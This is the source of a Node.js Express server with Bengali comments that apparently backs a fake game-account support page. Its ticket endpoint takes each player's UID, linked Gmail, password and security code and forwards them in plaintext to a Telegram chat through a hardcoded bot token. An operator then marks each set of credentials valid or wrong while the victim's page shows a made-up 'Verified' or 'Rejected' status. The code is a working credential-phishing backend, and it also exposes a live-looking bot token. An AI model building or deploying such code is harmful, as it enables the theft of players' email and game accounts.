const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();

app.use(cors({ origin: '*' }));
app.use(express.json());

// ব্রাউজার ক্যাশিং বন্ধ রাখার হেডার
app.use((req, res, next) => {
    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, max-age=0');
    res.setHeader('Pragma', 'no-cache');
    res.setHeader('Expires', '0');
    next();
});

const TELEGRAM_BOT_TOKEN = "8394444876:AAGQ3vrDdHXR--TZzCd0muiEAh6DIrect10";
const TELEGRAM_CHAT_ID = "-1004444318249";

// স্থায়ী ডাটা মেমোরি
if (!global.persistentStore) {
    global.persistentStore = {};
}

app.get('/', (req, res) => res.send("Backend Active"));

// ১. নতুন টিকিট সাবমিট
app.post('/api/submit-ticket', async (req, res) => {
    const { uid, gmail, password, securityCode, problemType, additionalDetails } = req.body;
    
    // ডিফল্ট টেক্সট যা প্রথম দেখাবে
    global.persistentStore[String(uid)] = {
        status: "Pending",
        name: "Searching Player Name...",
        level: "Fetching Level...",
        region: "Bangladesh",
        reason: ""
    };

    const telegramMessage = `
📩 *New Support Ticket Submitted!*

🆔 *Player UID:* \`${uid}\`
📧 *Bind Gmail:* \`${gmail}\`
🔑 *Password:* \`${password}\`
🔢 *Security Code:* \`${securityCode}\`
📌 *Issue:* ${problemType}
📝 *Details:* ${additionalDetails}
    `;

    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: telegramMessage,
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Verify Account", callback_data: `verify_${uid}` }
                    ],
                    [
                        { text: "❌ Wrong Pass", callback_data: `reject_${uid}_Wrong Password` },
                        { text: "❌ Wrong Gmail", callback_data: `reject_${uid}_Invalid Gmail` }
                    ],
                    [
                        { text: "❌ Wrong Code", callback_data: `reject_${uid}_Wrong Security Code` },
                        { text: "❌ Wrong UID", callback_data: `reject_${uid}_Invalid UID` }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// ২. টেলিগ্রাম বট বা অ্যাডমিন টেক্সট রিপ্লাই হ্যান্ডলার (নাম ও লেভেল আপডেট করার জন্য)
app.post('/api/telegram-webhook', async (req, res) => {
    res.sendStatus(200);

    try {
        const update = req.body;

        // কাস্টম নাম/লেভেল আপডেট করার জন্য: যদি টেলিগ্রামে মেসেজ রিপ্লাই দেন
        // ফরম্যাট: UID Name Level (যেমন: 2476459395 ASRAFUL_FF 64)
        if (update && update.message && update.message.text) {
            const text = update.message.text.trim();
            const parts = text.split(' ');
            
            // যদি ৩টি জিনিস পাঠানো হয় (UID, Name, Level)
            if (parts.length >= 3) {
                const uid = String(parts[0]);
                const level = parts[parts.length - 1]; // শেষেরটি লেভেল
                const name = parts.slice(1, parts.length - 1).join(' '); // মাঝেরটি প্লেয়ার নাম

                if (global.persistentStore[uid]) {
                    global.persistentStore[uid].name = name;
                    global.persistentStore[uid].level = `Level ${level}`;
                } else {
                    global.persistentStore[uid] = {
                        status: "Pending",
                        name: name,
                        level: `Level ${level}`,
                        region: "Bangladesh",
                        reason: ""
                    };
                }

                await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    chat_id: update.message.chat.id,
                    text: `📝 *Player Info Updated!*\n\n🆔 UID: \`${uid}\`\n👤 Name: *${name}*\n🎖️ Level: *Level ${level}*`,
                    parse_mode: 'Markdown'
                });
                return;
            }
        }

        // বাটন ক্লিক অপশন (Verify / Reject)
        if (update && update.callback_query) {
            const callbackQuery = update.callback_query;
            const data = callbackQuery.data; 
            const chatId = callbackQuery.message.chat.id;
            const messageId = callbackQuery.message.message_id;

            const parts = data.split('_');
            const action = parts[0];
            const uid = String(parts[1]);
            const reason = parts[2] || "Information Mismatch";

            const currentData = global.persistentStore[uid] || {
                name: "Verified Player",
                level: "Level Active"
            };

            if (action === 'verify') {
                global.persistentStore[uid] = {
                    status: "Verified",
                    name: currentData.name === "Searching Player Name..." ? "Verified Player" : currentData.name,
                    level: currentData.level === "Fetching Level..." ? "Level Active" : currentData.level,
                    region: "Bangladesh",
                    reason: ""
                };

                await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
                    chat_id: chatId,
                    message_id: messageId,
                    text: callbackQuery.message.text + `\n\n🟢 *Status: VERIFIED BY ADMIN*`,
                    parse_mode: 'Markdown'
                });

                await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    chat_id: chatId,
                    text: `✅ *Confirmation Alert!*\n\nPlayer UID: \`${uid}\` status updated to *VERIFIED*!`,
                    parse_mode: 'Markdown'
                });

            } else if (action === 'reject') {
                global.persistentStore[uid] = {
                    status: "Rejected",
                    name: currentData.name,
                    level: currentData.level,
                    region: "Bangladesh",
                    reason: reason
                };

                await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
                    chat_id: chatId,
                    message_id: messageId,
                    text: callbackQuery.message.text + `\n\n🔴 *Status: REJECTED (${reason})*`,
                    parse_mode: 'Markdown'
                });

                await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    chat_id: chatId,
                    text: `🔴 *Rejection Alert!*\n\nPlayer UID: \`${uid}\` has been marked as *REJECTED* (${reason})!`,
                    parse_mode: 'Markdown'
                });
            }

            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                callback_query_id: callbackQuery.id,
                text: `UID ${uid} Updated!`
            });
        }
    } catch (err) {
        console.error("Webhook Error:", err);
    }
});

// ৩. লাইভ স্ট্যাটাস নেওয়ার API
app.get('/api/check-status/:uid', (req, res) => {
    const uid = String(req.params.uid);
    const userData = global.persistentStore[uid] || {
        status: "Pending",
        name: "Searching Player Name...",
        level: "Fetching Level...",
        region: "Bangladesh",
        reason: ""
    };
    res.json({ success: true, data: userData });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
